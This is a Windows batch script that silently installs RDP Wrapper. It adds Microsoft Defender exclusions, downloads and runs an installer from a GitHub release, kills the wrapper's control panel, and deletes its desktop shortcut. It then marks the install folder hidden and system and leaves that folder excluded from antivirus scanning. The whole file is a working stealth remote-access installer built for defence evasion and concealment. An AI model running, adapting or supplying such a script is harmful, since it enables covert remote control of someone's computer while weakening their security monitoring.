@echo off
title      
set "RDPW_EXE=%TEMP%\RDPW_Installer.exe"
set "RDPW_DIR=%ProgramFiles%\RDP Wrapper"
set "SHORTCUT=%USERPROFILE%\Desktop\RDP_CnC.lnk"
powershell -Command "Add-MpPreference -ExclusionPath '%RDPW_EXE%'" >nul
powershell -Command "Add-MpPreference -ExclusionPath '%RDPW_DIR%'" >nul
powershell -Command "Invoke-WebRequest 'https://github.com/sebaxakerhtc/rdpwrap/releases/download/v1.8.9.9/RDPW_Installer.exe' -OutFile '%RDPW_EXE%'"
if exist "%RDPW_EXE%" (
    start /wait "" "%RDPW_EXE%"
    :wait
    tasklist | findstr /i "rdp_cnc.exe" >nul || (
        timeout /t 5 >nul
        goto wait
    )
    taskkill /f /im rdp_cnc.exe >nul
    del /f /q "%SHORTCUT%" >nul
)
del /f /q "%RDPW_EXE%" >nul
if exist "%RDPW_DIR%" attrib +h +s "%RDPW_DIR%"
powershell -Command "Remove-MpPreference -ExclusionPath '%RDPW_EXE%'" >nul
exit
